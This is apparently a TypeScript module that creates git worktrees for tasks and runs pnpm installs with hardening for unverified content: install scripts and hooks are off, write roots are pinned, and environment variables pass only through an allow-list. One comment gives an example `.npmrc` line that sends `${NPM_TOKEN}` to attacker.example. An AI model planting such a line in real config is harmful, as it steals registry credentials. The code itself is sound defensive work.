import { access, lstat, mkdir, realpath } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import type { CindyMakeTaskPreparation, MakeTaskWorkspace } from '../../shared/cindyMakeDoctor.js';
import { runSourceGit } from './sourceGit.js';
import { contentRef, snapshotContent, applyContent, taskContentRef } from './sourceContent.js';
import { assertPnpmInstallContained } from './pnpmWriteRoots.js';
import { runSourcePnpm } from './sourcePnpm.js';
import {
  CINDY_MAKE_RUN_ID_PATTERN,
  CINDY_PERSONAL_BRANCH,
  isCindyMakeWorktreePath,
  makeSourceCheckoutPath,
  makeTaskBranch,
  makeTaskWorktreePath,
  makeWorktreesRoot,
} from './sourcePaths.js';

export type TaskWorkspacePhase = 'checking' | 'creating' | 'installing';

/**
 * What an unverified install may see of the environment, matched
 * case-insensitively: process essentials and Cindy's own toolchain settings.
 * Everything else — above all credentials inherited from how Cindy was launched —
 * stays out, because `${VAR}` in a content `.npmrc` expands it into a request to a
 * host the content chooses.
 */
const UNVERIFIED_INSTALL_ENV =
  /^(?:path|systemroot|windir|comspec|tmp|temp|home|userprofile|lang|lc_.*|tz|corepack_.*|pnpm_manage_package_manager_versions|pythondontwritebytecode|pythonutf8|python|npm_config_(?:manage_package_manager_versions|managepackagemanagerversions|python))$/i;

export interface TaskWorkspaceDeps {
  /** Toolchain PATH (system tools first, managed copies otherwise). */
  processEnvironment: NodeJS.ProcessEnv;
  git?: typeof runSourceGit;
  pnpm?: typeof runSourcePnpm;
}

async function exists(file: string): Promise<boolean> {
  try {
    await access(file);
    return true;
  } catch {
    return false;
  }
}

/**
 * Create (or reuse) the per-task worktree: a fresh branch off the personal
 * baseline, checked out under `<root>/worktrees/<runId>`. Dependency installation
 * is a separate step after the task is visible. Reuse
 * keeps a retry after a crash from creating a second branch for the same task.
 */
export async function createCindyMakeWorktree(
  userData: string,
  runId: string,
  signal: AbortSignal,
  deps: TaskWorkspaceDeps,
  onPhase: (phase: TaskWorkspacePhase) => void = () => {},
): Promise<MakeTaskWorkspace> {
  if (!CINDY_MAKE_RUN_ID_PATTERN.test(runId)) {
    throw Object.assign(new Error('invalid run id'), { code: 'gitFailed' });
  }
  const git = deps.git ?? runSourceGit;
  const env = deps.processEnvironment;
  const contentGit = (args: string[], cwd: string, indexFile?: string) =>
    git({ ...env, ...(indexFile ? { GIT_INDEX_FILE: indexFile } : {}) }, args, cwd, signal);
  const sourcePath = makeSourceCheckoutPath(userData);
  const worktreePath = makeTaskWorktreePath(userData, runId);
  const branch = makeTaskBranch(runId);
  onPhase('checking');
  if (!(await exists(path.join(sourcePath, '.git')))) {
    throw Object.assign(new Error('source missing'), { code: 'environmentNotReady' });
  }
  const hasPersonal = await git(
    env,
    ['branch', '--list', CINDY_PERSONAL_BRANCH],
    sourcePath,
    signal,
  );
  if (!hasPersonal.trim()) {
    throw Object.assign(new Error('personal branch missing'), { code: 'environmentNotReady' });
  }
  const baseCommit = await git(
    env,
    ['rev-parse', `${CINDY_PERSONAL_BRANCH}^{commit}`],
    sourcePath,
    signal,
  );
  const hasBranch = (await git(env, ['branch', '--list', branch], sourcePath, signal)).trim();
  const worktreeGitFile = path.join(worktreePath, '.git');
  if (await exists(worktreePath)) {
    // A reused worktree must be the real one Git registered for this branch,
    // not an unrelated directory or a symlink placed at the expected path.
    if ((await lstat(worktreePath)).isSymbolicLink() || !(await exists(worktreeGitFile))) {
      throw Object.assign(new Error('worktree path occupied'), { code: 'gitFailed' });
    }
    const current = (
      await git(env, ['rev-parse', '--abbrev-ref', 'HEAD'], worktreePath, signal)
    ).trim();
    if (current !== branch) {
      throw Object.assign(new Error('worktree on unexpected branch'), { code: 'gitFailed' });
    }
    const common = (
      await git(
        env,
        ['rev-parse', '--path-format=absolute', '--git-common-dir'],
        worktreePath,
        signal,
      )
    ).trim();
    const canonical = (value: string) =>
      process.platform === 'win32' ? path.resolve(value).toLowerCase() : path.resolve(value);
    if (
      canonical(await realpath(common)) !== canonical(await realpath(path.join(sourcePath, '.git')))
    )
      throw Object.assign(new Error('foreign worktree'), { code: 'gitFailed' });
    const tree = await contentRef(contentGit, sourcePath, taskContentRef(runId, 'base'));
    if (tree && !(await contentRef(contentGit, sourcePath, taskContentRef(runId, 'initialized')))) {
      // Resume interrupted inheritance only when the task still has the original clean files.
      const currentTree = await snapshotContent(contentGit, worktreePath);
      const headTree = (await git(env, ['rev-parse', 'HEAD^{tree}'], worktreePath, signal)).trim();
      if (currentTree !== tree) {
        if (currentTree !== headTree)
          throw Object.assign(new Error('unfinished inheritance with edits'), { code: 'dirty' });
        await applyContent(contentGit, worktreePath, headTree, tree);
      }
      await contentGit(['update-ref', taskContentRef(runId, 'initialized'), tree], sourcePath);
    }
  } else {
    onPhase('creating');
    if (
      (await git(env, ['branch', '--show-current'], sourcePath, signal)).trim() !==
      CINDY_PERSONAL_BRANCH
    )
      throw Object.assign(new Error('unexpected source branch'), { code: 'gitFailed' });
    // Persist the file baseline before creation; never replace it on a retry.
    const baseRef = taskContentRef(runId, 'base');
    let tree = await contentRef(contentGit, sourcePath, baseRef);
    if (!tree && !hasBranch) tree = await snapshotContent(contentGit, sourcePath, baseRef);
    await mkdir(makeWorktreesRoot(userData), { recursive: true });
    if (hasBranch) {
      // Branch survived a removed directory (e.g. a manual clean-up). Prune the
      // stale registration and re-attach the branch rather than failing.
      await git(env, ['worktree', 'prune'], sourcePath, signal);
      await git(env, ['worktree', 'add', worktreePath, branch], sourcePath, signal);
    } else {
      await git(
        env,
        ['worktree', 'add', '-b', branch, worktreePath, CINDY_PERSONAL_BRANCH],
        sourcePath,
        signal,
      );
    }
    if (tree) {
      const headTree = (await git(env, ['rev-parse', 'HEAD^{tree}'], worktreePath, signal)).trim();
      await applyContent(contentGit, worktreePath, headTree, tree);
      await contentGit(['update-ref', taskContentRef(runId, 'initialized'), tree], sourcePath);
    }
  }
  return { path: worktreePath, branch, baseCommit: baseCommit.trim() };
}

/** Install dependencies in an already-created task worktree. */
export async function installCindyMakeWorktree(
  userData: string,
  workspace: MakeTaskWorkspace,
  signal: AbortSignal,
  deps: TaskWorkspaceDeps,
  onPhase: (phase: TaskWorkspacePhase) => void = () => {},
  onProgress?: (progress: NonNullable<CindyMakeTaskPreparation['dependencies']>) => void,
  /** `ignoreScripts`: the content is not verified yet; its lifecycle scripts do not run. */
  options: { ignoreScripts?: boolean } = {},
): Promise<MakeTaskWorkspace> {
  const pnpm = deps.pnpm ?? runSourcePnpm;
  onPhase('installing');
  signal.throwIfAborted();
  if (!isCindyMakeWorktreePath(userData, workspace.path)) {
    throw Object.assign(new Error('invalid task workspace'), { code: 'gitFailed' });
  }
  if (options.ignoreScripts) {
    // Unverified synced content must not point pnpm's write roots outside the
    // worktree: a tracked `node_modules` symlink would have it install through
    // the link, and content `.npmrc` / `pnpm-workspace.yaml` settings move the
    // write roots outright. Every write root must be a real descendant of the
    // worktree (see `pnpmWriteRoots`).
    await assertPnpmInstallContained(workspace.path);
  }
  await pnpm(
    options.ignoreScripts
      ? {
          // Unverified synced content runs no install-time code and sees a minimal
          // environment: no lifecycle scripts, no `.pnpmfile.cjs` hooks (which
          // `--ignore-scripts` alone would still execute), the write roots pinned
          // over any `.npmrc` of the content's own, and the user's npm credentials
          // never loaded — a content `.npmrc` must not route them to a proxy of its
          // choosing. Only what the install needs is forwarded at all: any inherited
          // variable could otherwise be expanded by a content `.npmrc`
          // (`//attacker.example/:_authToken=${NPM_TOKEN}`) into a credential sent
          // to a registry the content chooses (see `UNVERIFIED_INSTALL_ENV`).
          ...Object.fromEntries(
            Object.entries(deps.processEnvironment).filter(([key]) =>
              UNVERIFIED_INSTALL_ENV.test(key),
            ),
          ),
          npm_config_userconfig: os.devNull,
        }
      : deps.processEnvironment,
    [
      'install',
      '--frozen-lockfile',
      '--prefer-offline',
      '--prod=false',
      ...(options.ignoreScripts
        ? [
            '--ignore-scripts',
            '--ignore-pnpmfile',
            '--config.modules-dir=node_modules',
            '--config.virtual-store-dir=node_modules/.pnpm',
            '--config.store-dir=node_modules/.cindy-make-store',
            '--config.strict-ssl=true',
          ]
        : []),
    ],
    workspace.path,
    signal,
    ...(onProgress ? [onProgress] : []),
  );
  signal.throwIfAborted();
  return workspace;
}

/** Backwards-compatible synchronous preparation used by existing callers/tests. */
export async function prepareCindyMakeWorkspace(
  userData: string,
  runId: string,
  signal: AbortSignal,
  deps: TaskWorkspaceDeps,
  onPhase: (phase: TaskWorkspacePhase) => void = () => {},
): Promise<MakeTaskWorkspace> {
  const workspace = await createCindyMakeWorktree(userData, runId, signal, deps, onPhase);
  return installCindyMakeWorktree(userData, workspace, signal, deps, onPhase);
}

export { isCindyMakeWorktreePath };
